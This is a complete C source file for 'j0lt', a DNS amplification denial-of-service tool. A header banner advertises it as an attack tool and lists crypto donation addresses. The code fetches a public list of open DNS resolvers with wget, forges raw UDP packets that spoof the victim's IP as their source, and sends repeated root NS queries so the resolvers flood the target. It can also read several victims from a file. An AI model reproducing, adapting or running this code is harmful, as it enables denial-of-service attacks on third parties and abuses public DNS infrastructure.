/* PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE
 *      _________  .__   __
 *     |__\   _  \ |  |_/  |_
 *     |  /  /_\  \|  |\   __\
 *     |  \  \_/   \  |_|  |                               2021
 * /\__|  |\_____  /____/__|         the-scientist:spl0its-r-us
 * \______|      \/              ddos amplification attack tool
 * ------------------------------------------------------------
 * This is unpublished proprietary source code of spl0its-r-us
 * For educational purposes only
 * the-scientist@rootstorm.com
 * ------------------------------------------------------------
 * Usage: sudo ./j0lt -t <target> -p <port> -m <magnitude>
 * (the-scientist㉿rs)-$ gcc j0lt.c -o j0lt
 * (the-scientist㉿rs)-$ sudo ./j0lt -t 127.0.0.1 -p 80 -m 1337
 * ------------------------------------------------------------
 * Options:
 * [-x] will print a hexdump of the packet headers
 * [-d] puts j0lt into debug mode, no packets are sent
 * [-r list] will not fetch a resolv list, if one is provided.
 * ------------------------------------------------------------
 * BITCOIN:        bc1qc0x6qdsk7auhsrym6vz0rtafnl2qgqjk7yy3tn
 * ETHEREUM:       0x482d85E39Ce865Dcf7c26bFDD6e52AB203d0f555
 * DOGECOIN:       DPYxWnnyYzmPYWP92iqo4DizJht3rZnYnu
 * LITECOIN:       ltc1qea6ehaanwr9q3jygmw75q35avk8t74h7sc5uc3
 * ETHCLASSIC:     0x6C63D4428Cb6BfDB7AC72b447A8B29D811395052
 * CARDANO:        addr1qxn4przua2crcrgwt3pk5465ym3syytfn2v7gssu7ayuvpvefqwdvkgzn4y3j5d5ynsh03kae9k8d0z8yuh8excuv6xqdl4kyt
 */

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <limits.h>
#include <errno.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <unistd.h>
#include <spawn.h>
#include <syslog.h>
#include <stdarg.h>

#include "colors.h"


typedef struct __attribute__((packed, aligned(1)))
{
	uint32_t sourceaddr;
	uint32_t destaddr;

#if __BYTE_ORDER == __BIGENDIAN
	uint32_t zero: 8;
	uint32_t protocol: 8;
	uint32_t udplen: 16;
#endif

#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
	uint32_t udplen: 16;
	uint32_t protocol: 8;
	uint32_t zero: 8;
#endif
} PSEUDOHDR;

static const char* appname = "j0lt";

inline static void err_exit(const char* fmt, ...)
{
	va_list list;
	va_start(list, fmt);
	vsyslog(LOG_ERR, fmt, list);
	size_t len = strlen(fmt);
	char printffmt[len + 6];
	sprintf(printffmt, COLOR_RED "%s" COLOR_RESET, fmt);
	vfprintf(stderr, printffmt, list);
	exit(EXIT_FAILURE);
}

#define DEFINE_INSERT_FN(typename, datatype)            \
        bool insert_##typename                          \
        (uint8_t** buf, size_t* buflen, datatype data)  \
    {                                                   \
        uint64_t msb_mask, lsb_mask,                    \
            bigendian_data, lsb, msb;                   \
        size_t byte_pos, nbits;                         \
                                                        \
        if (*buflen < 1) {                              \
            return false;                               \
        }                                               \
                                                        \
        nbits = sizeof(data) << 3;                      \
        bigendian_data = 0ULL;                          \
        byte_pos = (nbits / 8) - 1;                     \
        lsb_mask = 0xffULL;                             \
        msb_mask = (lsb_mask << nbits) - 8;             \
                                                        \
        byte_pos = byte_pos << 3;                       \
        for (int i = nbits >> 4; i != 0; i--) {         \
            lsb = (data & lsb_mask);                    \
            msb = (data & msb_mask);                    \
            lsb <<= byte_pos;                           \
            msb >>= byte_pos;                           \
            bigendian_data |= lsb | msb;                \
            msb_mask >>= 8;                             \
            lsb_mask <<= 8;                             \
            byte_pos -= (2 << 3);                       \
        }                                               \
                                                        \
        data = bigendian_data == 0 ?                    \
            data : bigendian_data;                      \
        for (int i = sizeof(data);                      \
             *buflen != -1 && i > 0; i--) {             \
            *(*buf)++ = (data & 0xff);                  \
            data = (data >> 8);                         \
            (*buflen)--;                                \
        }                                               \
                                                        \
        return data == 0;                               \
    }                                                   \


DEFINE_INSERT_FN(byte, uint8_t)

DEFINE_INSERT_FN(word, uint16_t)

DEFINE_INSERT_FN(dword, uint32_t)

DEFINE_INSERT_FN(qword, uint64_t)

#undef DEFINE_INSERT_FN

// IP HEADER VALUES
#define     IP_IHL_MIN_J0LT 5
#define     IP_IHL_MAX_J0LT 15
#define     IP_TTL_J0LT 0x40
#define     IP_ID_J0LT 0xc4f3
// FLAGS
#define     IP_RF_J0LT 0x8000 // reserved fragment flag
#define     IP_DF_J0LT 0x4000 // dont fragment flag
#define     IP_MF_J0LT 0x2000 // more fragments flag
#define     IP_OF_J0LT 0x0000
// END FLAGS
#define     IP_VER_J0LT 4
// END IPHEADER VALUES

// DNS HEADER VALUES
#define     DNS_ID_J0LT 0xb4b3
#define     DNS_QR_J0LT 0 // query (0), response (1).
// OPCODE
#define     DNS_OPCODE_J0LT ns_o_query
// END OPCODE
#define     DNS_AA_J0LT 0 // Authoritative Answer
#define     DNS_TC_J0LT 0 // TrunCation
#define     DNS_RD_J0LT 1 // Recursion Desired
#define     DNS_RA_J0LT 0 // Recursion Available
#define     DNS_Z_J0LT 0 // Reserved
#define     DNS_AD_J0LT 0 // dns sec
#define     DNS_CD_J0LT 0 // dns sec
// RCODE
#define     DNS_RCODE_J0LT ns_r_noerror
// END RCODE
#define     DNS_QDCOUNT_J0LT 0x0001 // num questions
#define     DNS_ANCOUNT_J0LT 0x0000 // num answer RRs
#define     DNS_NSCOUNT_J0LT 0x0000 // num authority RRs
#define     DNS_ARCOUNT_J0LT 0x0000 // num additional RRs
// END HEADER VALUES
#define     PEWPEW_J0LT 100 // value for the tmc effect.
#define     MAX_LINE_SZ_J0LT 0x30

char** environ;
const char* g_args = "xdt:p:m:r:T:";
const char* g_path = "/tmp/resolv.txt";
char* g_wget[] = {
		"/bin/wget", "-O", "/tmp/resolv.txt",
		"https://public-dns.info/nameservers.txt",
		NULL
};

const char* g_menu = {
		COLOR_RESET COLOR_BLUE_BG COLOR_WHITE
		"                                                            "
		COLOR_DEFAULT_BG COLOR_RESET "\n" COLOR_BLUE_BG COLOR_WHITE
		"  ========================================================= "
		COLOR_DEFAULT_BG COLOR_RESET "\n" COLOR_BLUE_BG COLOR_WHITE
		"  Usage: sudo ./j0lt -t/-T -p -m [OPTION]...                "
		COLOR_DEFAULT_BG COLOR_RESET "\n" COLOR_BLUE_BG COLOR_WHITE
		"  -t <target>                      : target IPv4 (spoof)    "
		COLOR_DEFAULT_BG COLOR_RESET "\n" COLOR_BLUE_BG COLOR_WHITE
		"  -T <filename>                    : target IPv4 list file  "
		COLOR_DEFAULT_BG COLOR_RESET "\n" COLOR_BLUE_BG COLOR_WHITE
		"  -p <port>                        : target port            "
		COLOR_DEFAULT_BG COLOR_RESET "\n" COLOR_BLUE_BG COLOR_WHITE
		"  -m <magnitude>                   : magnitude of attack    "
		COLOR_DEFAULT_BG COLOR_RESET "\n" COLOR_BLUE_BG COLOR_WHITE
		"  -x [hexdump]                     : print hexdump          "
		COLOR_DEFAULT_BG COLOR_RESET "\n" COLOR_BLUE_BG COLOR_WHITE
		"  -d [debug]                       : offline debug mode     "
		COLOR_DEFAULT_BG COLOR_RESET "\n" COLOR_BLUE_BG COLOR_WHITE
		"  -r [resolv]<path>                : will not download list "
		COLOR_DEFAULT_BG COLOR_RESET "\n" COLOR_BLUE_BG COLOR_WHITE
		"                                   : provide absolute path  "
		COLOR_DEFAULT_BG COLOR_RESET "\n" COLOR_BLUE_BG COLOR_WHITE
		"  ========================================================= "
		COLOR_DEFAULT_BG COLOR_RESET "\n" COLOR_BLUE_BG COLOR_WHITE
		"  sc1entist spl0its-r-us     (modified by imper)            "
		COLOR_DEFAULT_BG COLOR_RESET "\n" COLOR_BLUE_BG COLOR_WHITE
		"                                                            "
		COLOR_DEFAULT_BG COLOR_RESET "\n"
};

inline static bool read_file_into_mem(const char* filename, void** data_out, size_t* size_out);

inline static size_t readline(char* src, char* dest, size_t srclim, size_t destlim);

inline static size_t forge_j0lt_packet(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport);

inline static bool insert_dns_header(uint8_t** buf, size_t* buflen);

inline static bool insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);

inline static bool insert_udp_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uint8_t* data, size_t ulen, uint16_t sport);

inline static bool insert_ip_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* pheader, uint32_t daddr, uint32_t saddr, size_t ulen);

inline static bool send_payload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten);

inline static bool insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len);

inline static uint16_t j0lt_checksum(const uint16_t* addr, size_t count);

inline static void print_hex(void* data, size_t len);

#define EXIT_ERR_MESSAGE COLOR_RESET "Usage: " COLOR_MAGENTA "\"%s\"" COLOR_RESET " -t " COLOR_BLUE "target" COLOR_RESET " / -T " COLOR_BLUE "file_with_targets"\
                         COLOR_RESET " -p " COLOR_BLUE "port" COLOR_RESET " -m " COLOR_BLUE "magnitude" COLOR_RESET " [OPTIONS]...\n"

inline static int proceed(
		uint16_t spoofport, uint16_t magnitude, uint32_t spoofip, bool debugmode, bool hexmode, bool filereadmode, const char* pathptr)
{
	posix_spawnattr_t attr;
	posix_spawnattr_t* attrp;
	posix_spawn_file_actions_t file_actions;
	posix_spawn_file_actions_t* file_actionsp;
	char* resolvptr;
	int status, i, s, nread;
	pid_t child_pid;
	sigset_t mask;
	uint32_t resolvip;
	void* resolvlist;
	size_t szresolvlist, szpayload, szpewpew;
	char payload[NS_PACKETSZ], lineptr[MAX_LINE_SZ_J0LT];
	
	
	if (magnitude == 0 || spoofport == 0 || spoofip == 0)
		err_exit(EXIT_ERR_MESSAGE, appname);
	
	attrp = NULL;
	file_actionsp = NULL;
	if (filereadmode == false)
	{
		pathptr = g_path;
		s = posix_spawnattr_init(&attr);
		if (s != 0)
			err_exit("(E) posix_spawnattr_init");
		s = posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETSIGMASK);
		if (s != 0)
			err_exit("(E) posix_spawnattr_setflags");
		
		sigfillset(&mask);
		s = posix_spawnattr_setsigmask(&attr, &mask);
		if (s != 0)
			err_exit("(E) posix_spawnattr_setsigmask");
		
		attrp = &attr;
		
		s = posix_spawnp(&child_pid, g_wget[0], file_actionsp, attrp, &g_wget[0], environ);
		if (s != 0)
			err_exit("(E) posix_spawn");
		
		if (attrp != NULL)
		{
			s = posix_spawnattr_destroy(attrp);
			if (s != 0)
				err_exit("(E) posix_spawnattr_destroy");
		}
		
		if (file_actionsp != NULL)
		{
			s = posix_spawn_file_actions_destroy(file_actionsp);
			if (s != 0)
				err_exit("(E) posix_spawn_file_actions_destroy");
		}
		do
		{
			s = waitpid(child_pid, &status, WUNTRACED | WCONTINUED);
			if (s == -1)
				err_exit("(E) waitpid");
		}
		while (!WIFEXITED(status) && !WIFSIGNALED(status));
	}
	printf(COLOR_GREEN "+ resolv list saved to %s\n" COLOR_RESET, pathptr);
	
	if (read_file_into_mem(pathptr, &resolvlist, &szresolvlist) == false)
		err_exit("(E) file read error");
	if (filereadmode == false)
	{
		remove(pathptr);
		printf(COLOR_GREEN "- resolv list removed from %s\n" COLOR_RESET, pathptr);
	}
	
	while (magnitude >= 1)
	{
		nread = 0;
		resolvptr = (char*)resolvlist;
		printf(COLOR_BLUE "+ current attack magnitude " COLOR_YELLOW "%d \n" COLOR_RESET, magnitude);
		while (nread = readline(lineptr, resolvptr, MAX_LINE_SZ_J0LT, szresolvlist) != 0)
		{
			resolvptr += nread;
			szresolvlist -= nread;
			for (i = 0; isdigit(lineptr[i]); i++);
			if (lineptr[i] != '.') // check ip4
				continue;
			resolvip = inet_addr(lineptr);
			if (resolvip == 0)
				continue;
			szpayload = forge_j0lt_packet(payload, htonl(resolvip), htonl(spoofip), spoofport);
			if (debugmode == false)
			{
				szpewpew = PEWPEW_J0LT;
				while (szpewpew-- > 0)
					send_payload((uint8_t*)payload, resolvip, htons(NS_DEFAULTPORT), szpayload);
			}
			if (hexmode == 1)
				print_hex(payload, szpayload);
		}
		magnitude--;
	}
	
	free(resolvlist);
	return 0;
}

typedef struct
{
	void* data;
	struct LINKEDLIST* next;
} LINKEDLIST, * PLINKEDLIST;

int main(int argc, char** argv)
{
	appname = argv[0];
	
	char resolvpath[PATH_MAX];
	const char* pathptr;
	char* endptr;
	int opt, pathsz;
	bool debugmode, hexmode, filereadmode, file_ip_input_mode;
	uint32_t spoofip;
	uint16_t spoofport, magnitude = UINT16_MAX;
	PLINKEDLIST ip_addresses_list = NULL;
	
	openlog(appname, LOG_PID | LOG_CONS, LOG_USER);
	
	printf("%s", g_menu);
	
	filereadmode = debugmode = hexmode = false;
	spoofport = spoofip = 0;
	opt = getopt(argc, argv, g_args);
	do
	{
		switch (opt)
		{
			case 't':
				while (*optarg == ' ')
					optarg++;
				spoofip = inet_addr(optarg);
				if (spoofip == 0)
					err_exit("(E) Invalid spoof ip");
				break;
			case 'T':
				while (*optarg == ' ')
					optarg++;
				FILE* ip_list_file = fopen(optarg, "rb");
				PLINKEDLIST* list_iter = &ip_addresses_list;
				file_ip_input_mode = true;
				while (true)
				{
					char* ip_addr_str = calloc(sizeof(ip_addr_str), 20);
					if (fgets(ip_addr_str, 20, ip_list_file))
					{
						spoofip = inet_addr(ip_addr_str);
						if (spoofip == 0)
							err_exit("(E) Invalid spoof ip");
						*list_iter = calloc(sizeof(LINKEDLIST), 1);
						(*list_iter)->data = ip_addr_str;
						list_iter = &(*list_iter)->next;
					}
					else break;
				}
			case 'p':
				errno = 0;
				spoofport = (uint16_t)strtol(optarg, &endptr, 0);
				if (!file_ip_input_mode && (errno != 0 || endptr == optarg || *endptr != '\0'))
					err_exit("(E) Spoof port invalid");
				break;
			case 'm':
				errno = 0;
				magnitude = (uint16_t)strtol(optarg, &endptr, 0);
//				if (errno != 0 || endptr == optarg || *endptr != '\0')
//					err_exit("* magnituted invalid");
				break;
			case 'r':
				
				while (*optarg == ' ')
					optarg++;
				filereadmode = true;
				pathsz = strlen(optarg);
				if (pathsz >= PATH_MAX)
					err_exit("(E) Path size invalid");
				memcpy(resolvpath, optarg, pathsz);
				pathptr = resolvpath;
				break;
			case 'x':
				hexmode = true;
				break;
			case 'd':
				debugmode = true;
				break;
			case -1:
			default: /* '?' */
				printf(EXIT_ERR_MESSAGE, appname);
				err_exit("(E) Invalid arguments");
		}
	}
	while ((opt = getopt(argc, argv, g_args)) != -1);
	
	if (file_ip_input_mode)
	{
		int ret;
		for (PLINKEDLIST list = ip_addresses_list; list != NULL; list = list->next)
		{
			printf(COLOR_GREEN "Processing address \"%s\"..." COLOR_RESET, (char*)list->data);
			spoofip = inet_addr(list->data);
			if (spoofip == 0)
				err_exit("(E) Invalid spoof ip");
			
			if ((ret = proceed(spoofport, magnitude, spoofip, debugmode, hexmode, filereadmode, pathptr)))
			{
				free(list->data);
				return ret;
			}
			free(list->data);
		}
		return ret;
	}
	
	return proceed(spoofport, magnitude, spoofip, debugmode, hexmode, filereadmode, pathptr);
}


inline static bool read_file_into_mem(const char* filename, void** data_out, size_t* size_out)
{
	long filesize;
	void* mem;
	FILE* file;
	
	file = fopen(filename, "rb");
	if (file == NULL)
		return false;
	
	fseek(file, 0, SEEK_END);
	filesize = ftell(file);
	rewind(file);
	
	mem = malloc(filesize);
	if (mem == NULL)
	{
		fclose(file);
		return false;
	}
	
	if (fread(mem, filesize, 1, file) != 1)
	{
		printf("(E) Failed to read data\n");
		fclose(file);
		free(mem);
		return false;
	}
	
	fclose(file);
	
	*data_out = mem;
	*size_out = filesize;
	return true;
}


inline static size_t readline(char* src, char* dest, size_t srclim, size_t destlim)
{
	size_t i;
	
	for (i = 0; i < srclim - 1 && i < destlim && *dest != '\n'; ++i)
		src[i] = *dest++;
	src[i] = '\0';
	return i;
}


inline static size_t forge_j0lt_packet(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport)
{
	const char* url = ".";
	uint8_t pktbuf[NS_PACKETSZ], datagram[NS_PACKETSZ];
	uint8_t* curpos;
	size_t buflen, nwritten, szdatagram, udpsz;
	bool status;
	
	PSEUDOHDR pseudoheader;
	
	buflen = NS_PACKETSZ;
	memset(pktbuf, 0, NS_PACKETSZ);
	
	curpos = pktbuf;
	status = true;
	status &= insert_dns_header(&curpos, &buflen);
	status &= insert_dns_question((void**)&curpos, &buflen, url, ns_t_ns, ns_c_in);
	
	if (status == false)
		return 0;
	
	memset(datagram, 0, NS_PACKETSZ);
	curpos = datagram;
	udpsz = NS_PACKETSZ - buflen + sizeof(struct udphdr);
	status &= insert_ip_header(&curpos, &buflen, &pseudoheader, resolvip, spoofip, udpsz);
	status &= insert_udp_header(&curpos, &buflen, &pseudoheader, pktbuf, udpsz, spoofport);
	if (status == false)
		return 0;
	
	szdatagram = buflen;
	insert_data((void**)&curpos, &szdatagram, pktbuf, udpsz);
	nwritten = NS_PACKETSZ - buflen;
	
	memcpy(payload, datagram, nwritten);
	
	return nwritten;
}


inline static bool insert_dns_header(uint8_t** buf, size_t* buflen)
{
	bool status;
	uint8_t third_byte, fourth_byte;
	
	third_byte = (
			DNS_RD_J0LT |
			DNS_TC_J0LT << 1 |
			DNS_AA_J0LT << 2 |
			DNS_OPCODE_J0LT << 3 |
			DNS_QR_J0LT << 7
	);
	
	fourth_byte = (
			DNS_RCODE_J0LT |
			DNS_CD_J0LT << 4 |
			DNS_AD_J0LT << 5 |
			DNS_Z_J0LT << 6 |
			DNS_RA_J0LT << 7
	);
	
	status = true;
	status &= insert_word(buf, buflen, DNS_ID_J0LT);
	
	status &= insert_byte(buf, buflen, third_byte);
	status &= insert_byte(buf, buflen, fourth_byte);
	
	status &= insert_word(buf, buflen, DNS_QDCOUNT_J0LT);
	status &= insert_word(buf, buflen, DNS_ANCOUNT_J0LT);
	status &= insert_word(buf, buflen, DNS_NSCOUNT_J0LT);
	status &= insert_word(buf, buflen, DNS_ARCOUNT_J0LT);
	
	return status;
}


inline static bool insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
{
	const char* token;
	char* saveptr, qname[NS_PACKETSZ];
	size_t srclen, domainlen, dif;
	bool status;
	
	dif = *buflen;
	domainlen = strlen(domain) + 1;
	if (domainlen > NS_PACKETSZ - 1)
		return false;
	
	memcpy(qname, domain, domainlen);
	if (qname[0] != '.')
	{
		token = strtok_r(qname, ".", &saveptr);
		if (token == NULL)
			return false;
		while (token != NULL)
		{
			srclen = strlen(token);
			insert_byte((uint8_t**)buf, buflen, srclen);
			insert_data(buf, buflen, token, srclen);
			token = strtok_r(NULL, ".", &saveptr);
		}
	}
	
	status = true;
	status &= insert_byte((uint8_t**)buf, buflen, 0x00);
	status &= insert_word((uint8_t**)buf, buflen, query_type);
	status &= insert_word((uint8_t**)buf, buflen, query_class);
	
	dif -= *buflen;
	if (dif % 2 != 0) // pad
		status &= insert_byte((uint8_t**)buf, buflen, 0x00);
	
	return status;
}


inline static bool insert_udp_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uint8_t* data, size_t ulen, uint16_t sport)
{
	bool status;
	size_t totalsz = sizeof(PSEUDOHDR) + ulen;
	size_t datasz = (ulen - sizeof(struct udphdr));
	size_t udpsofar;
	uint16_t checksum;
	uint8_t pseudo[totalsz];
	uint8_t* pseudoptr = pseudo;
	
	status = true;
	status &= insert_word(buf, buflen, sport);
	status &= insert_word(buf, buflen, NS_DEFAULTPORT);
	status &= insert_word(buf, buflen, (uint16_t)ulen);
	udpsofar = sizeof(struct udphdr) - 2;
	
	memset(pseudo, 0, totalsz);
	insert_dword(&pseudoptr, &totalsz, phdr->sourceaddr);
	insert_dword(&pseudoptr, &totalsz, phdr->destaddr);
	insert_byte(&pseudoptr, &totalsz, phdr->zero);
	insert_byte(&pseudoptr, &totalsz, phdr->protocol);
	insert_word(&pseudoptr, &totalsz, sizeof(struct udphdr));
	
	*buf -= udpsofar;
	insert_data((void**)&pseudoptr, (void*)&totalsz, *buf, udpsofar + 2);
	*buf += udpsofar;
	insert_data((void**)&pseudoptr, (void*)&totalsz, data, datasz);
	checksum = j0lt_checksum((uint16_t*)pseudo, sizeof(PSEUDOHDR) + ulen);
	checksum -= datasz; // wtf...
	status &= insert_word(buf, buflen, checksum);
	
	return status;
}


inline static bool insert_ip_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* pheader, uint32_t daddr, uint32_t saddr, size_t ulen)
{
	bool status;
	uint8_t* bufptr = *buf;
	uint8_t first_byte;
	uint16_t checksum;
	
	status = true;
	first_byte = IP_VER_J0LT << 4 | IP_IHL_MIN_J0LT;
	status &= insert_byte(buf, buflen, first_byte);
	status &= insert_byte(buf, buflen, 0x00); // TOS
	status &= insert_word(buf, buflen, (IP_IHL_MIN_J0LT << 2) + ulen); // total len
	status &= insert_word(buf, buflen, IP_ID_J0LT);
	status &= insert_word(buf, buflen, IP_OF_J0LT);
	status &= insert_byte(buf, buflen, IP_TTL_J0LT);
	status &= insert_byte(buf, buflen, getprotobyname("udp")->p_proto);
	status &= insert_word(buf, buflen, 0x0000);
	status &= insert_dword(buf, buflen, saddr);
	status &= insert_dword(buf, buflen, daddr);
	
	checksum = j0lt_checksum((const uint16_t*)bufptr, (size_t)(IP_IHL_MIN_J0LT << 2));
	*buf -= 0xa;
	*(*buf)++ = (checksum & 0xff00) >> 8;
	**buf = checksum & 0xff;
	*buf += 9;
	
	memset(pheader, 0, sizeof(PSEUDOHDR));
	pheader->protocol = getprotobyname("udp")->p_proto;
	pheader->destaddr = daddr;
	pheader->sourceaddr = saddr;
	
	return status;
}


inline static bool send_payload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten)
{
	int raw_sockfd;
	ssize_t nread;
	struct sockaddr_in addr;
	
	raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (raw_sockfd == -1)
		err_exit("(E) Fatal socket error run using sudo");
	
	addr.sin_family = AF_INET;
	addr.sin_port = uh_dport;
	addr.sin_addr.s_addr = daddr;
	
	nread = sendto(
			raw_sockfd,
			datagram,
			nwritten,
			0,
			(const struct sockaddr*)&addr,
			sizeof(addr)
	);
	
	close(raw_sockfd);
	return !(nread == -1 || nread != nwritten);
}


inline static bool insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
{
	if (*dst_buflen < src_len)
		return false;
	
	memcpy(*dst, src, src_len);
	*dst += src_len;
	*dst_buflen -= src_len;
	
	return true;
}


inline static uint16_t j0lt_checksum(const uint16_t* addr, size_t count)
{
	register uint64_t sum = 0;
	
	while (count > 1)
	{
		sum += *(uint16_t*)addr++;
		count -= 2;
	}
	
	if (count > 0)
		sum += *(uint8_t*)addr;
	
	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	
	return ~((uint16_t)((sum << 8) | (sum >> 8)));
}


inline static void print_hex(void* data, size_t len)
{
	const uint8_t* d = (const uint8_t*)data;
	size_t i, j;
	for (j = 0, i = 0; i < len; i++)
	{
		if (i % 16 == 0)
		{
			printf("\n0x%.4zx: ", j);
			j += 16;
		}
		if (i % 2 == 0)
			putchar(' ');
		printf("%.2x", d[i]);
	}
	putchar('\n');
}
